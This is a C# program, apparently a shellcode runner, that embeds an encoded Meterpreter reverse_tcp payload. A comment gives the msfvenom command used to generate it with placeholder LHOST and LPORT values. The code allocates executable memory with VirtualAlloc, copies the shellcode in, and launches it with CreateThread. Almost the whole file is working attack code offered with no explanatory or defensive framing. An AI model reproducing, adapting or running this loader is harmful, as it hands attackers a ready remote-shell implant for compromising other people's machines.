using System;
using System.Runtime.InteropServices;

namespace NixShady
{
    class Program
    {
        static void Main(string[] args)
        {
            // msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 15 -f c
            byte[] shellcode = new byte[] {
                0x48,0x31,0xc9,0x48,0x81,0xe9,0xc0,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,
                0xff,0xff,0x48,0xbb,0x0b,0xb8,0x5a,0x68,0x7e,0x07,0xa1,0x38,0x48,0x31,0x58,
                0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0xf7,0xf0,0xd9,0x8c,0x8e,0xef,
                0x6d,0x38,0x0b,0xb8,0x1b,0x39,0x3f,0x57,0xf3,0x70,0x3a,0x6a,0x0b,0x0d,0x36,
                0x8c,0xf3,0x58,0x5d,0xf0,0xd1,0x3a,0x66,0x4f,0x2a,0x6a,0x2b,0xf0,0x55,0xdf,
                0x34,0x4d,0xe9,0xb3,0x79,0xe8,0x17,0x59,0xb7,0x4f,0x90,0xf8,0xa7,0x84,0x3b,
                0x14,0x7c,0x2b,0x81,0x79,0xca,0x71,0x57,0x29,0x7f,0xc6,0x43,0xd5,0x59,0xf9,
                0x0b,0x20,0xf5,0x55,0x81,0xb3,0x49,0x84,0x12,0x69,0xae,0x61,0x20,0x40,0x13,
                0xb3,0x58,0x67,0xfb,0x75,0xa1,0x38,0x0b,0x33,0xda,0xe0,0x7e,0x07,0xa1,0x70,
                0x8e,0x78,0x2e,0x0f,0x36,0x06,0x71,0x68,0x80,0xf0,0x42,0x2c,0xf5,0x47,0x81,
                0x71,0x0a,0x68,0xb9,0x3e,0x33,0x36,0x68,0x70,0xf4,0x71,0x1b,0xe3,0x4a,0x8f,
                0xe9,0x39,0xdd,0xf0,0x6b,0xa8,0x3f,0xc6,0x68,0x35,0xa7,0xf9,0x5b,0xa9,0x46,
                0xe7,0xd4,0xc9,0x47,0xbb,0x16,0x4c,0x76,0x42,0x98,0xe9,0x7e,0x60,0x02,0x2c,
                0xf5,0x47,0x85,0x71,0x0a,0x68,0x3c,0x29,0xf5,0x0b,0xe9,0x7c,0x80,0xf8,0x46,
                0x21,0x7f,0xd7,0xe0,0xb3,0x0f,0x30,0x12,0x69,0xae,0x46,0xf9,0x79,0x53,0xe6,
                0x03,0x32,0x3f,0x5f,0xe0,0x61,0x4a,0xe2,0x12,0xeb,0x92,0x27,0xe0,0x6a,0xf4,
                0x58,0x02,0x29,0x27,0x5d,0xe9,0xb3,0x19,0x51,0x11,0x97,0x81,0xf8,0xfc,0x71,
                0xb5,0xcf,0x29,0x5a,0x21,0x34,0x93,0x38,0x0b,0xf9,0x0c,0x21,0xf7,0xe1,0xe9,
                0xb9,0xe7,0x18,0x5b,0x68,0x7e,0x4e,0x28,0xdd,0x42,0x04,0x58,0x68,0x7a,0xd5,
                0xab,0x38,0x09,0x0d,0x1b,0x3c,0x37,0x8e,0x45,0x74,0x82,0x49,0x1b,0xd2,0x32,
                0x70,0x87,0x3f,0xf4,0x6d,0x16,0xe1,0x94,0x6f,0xa0,0x39,0x0b,0xb8,0x03,0x29,
                0xc4,0x2e,0x21,0x53,0x0b,0x47,0x8f,0x02,0x74,0x46,0xff,0x68,0x5b,0xf5,0x6b,
                0xa1,0x33,0x36,0x61,0x70,0xf4,0x78,0x12,0xe1,0xbc,0x4f,0x5e,0xf8,0x43,0x31,
                0x9b,0x29,0xc4,0xed,0xae,0xe7,0xeb,0x47,0x8f,0x20,0xf7,0xc0,0xcb,0x28,0x4a,
                0xe0,0x16,0xe1,0x9c,0x4f,0x28,0xc1,0x4a,0x02,0xc3,0xcd,0x0a,0x66,0x5e,0xed,
                0x8e,0x78,0x2e,0x62,0x37,0xf8,0x6f,0x4d,0xee,0x50,0xc9,0x68,0x7e,0x07,0xe9,
                0xbb,0xe7,0xa8,0x12,0xe1,0x9c,0x4a,0x90,0xf1,0x61,0xbc,0x1b,0x30,0x36,0x8e,
                0x58,0x79,0xb1,0xba,0x83,0xa0,0x21,0xf8,0x74,0xbb,0xf3,0xb8,0x24,0x3d,0x36,
                0x84,0x65,0x18,0x55,0x31,0xac,0x02,0x3e,0x46,0xf8,0x50,0x0b,0xa8,0x5a,0x68,
                0x3f,0x5f,0xe9,0xb1,0xf9,0xf0,0x6b,0xa1,0x3f,0xbd,0xf9,0x9c,0x58,0x5d,0xa5,
                0xbd,0x36,0x8e,0x62,0x71,0x82,0x7f,0x17,0x59,0xb7,0x4e,0x28,0xc8,0x43,0x31,
                0x80,0x20,0xf7,0xfe,0xe0,0x82,0x09,0x61,0x92,0x37,0x81,0xd2,0x22,0xc0,0x0b,
                0xc5,0x72,0x30,0x3f,0x50,0xf8,0x50,0x0b,0xf8,0x5a,0x68,0x3f,0x5f,0xcb,0x38,
                0x51,0xf9,0xe0,0x63,0x51,0x08,0x91,0xc7,0xde,0xef,0x03,0x29,0xc4,0x72,0xcf,
                0x75,0x6a,0x47,0x8f,0x21,0x81,0xc9,0x48,0x04,0xf4,0x47,0xa5,0x20,0x7f,0xc4,
                0xe9,0x11,0xcd,0xf0,0xdf,0x9e,0x0b,0xb3,0xe0,0xc7,0xec,0xe0,0x30,0x68,0x27,
                0x4e,0x66,0xfa,0xfb,0x0d,0xf8,0x3e,0x81,0xd2,0xa1,0x38 
            };

            UInt64 funcAddr = VirtualAlloc(0, (UInt64)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt64 threadId = 0;
            // prepare data
            IntPtr pinfo = IntPtr.Zero;
            // execute native code
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        private static UInt64 MEM_COMMIT = 0x1000;
        private static UInt64 PAGE_EXECUTE_READWRITE = 0x40;
        [DllImport("kernel32")]
        private static extern UInt64 VirtualAlloc(UInt64 lpStartAddr,
        UInt64 size, UInt64 flAllocationType, UInt64 flProtect);
        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress,
        UInt64 dwSize, UInt64 dwFreeType);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
           UInt64 lpThreadAttributes,
           UInt64 dwStackSize,
           UInt64 lpStartAddress,
           IntPtr param,
           UInt64 dwCreationFlags,
           ref UInt64 lpThreadId
         );
        [DllImport("kernel32")]
        private static extern bool CloseHandle(IntPtr handle);
        [DllImport("kernel32")]
        private static extern UInt64 WaitForSingleObject(IntPtr hHandle, UInt64 dwMilliseconds);
        [DllImport("kernel32")]
        private static extern IntPtr GetModuleHandle(string moduleName);
        [DllImport("kernel32")]
        private static extern UInt64 GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        private static extern UInt64 LoadLibrary(string lpFileName);
        [DllImport("kernel32")]
        private static extern UInt64 GetLastError();
    }
}
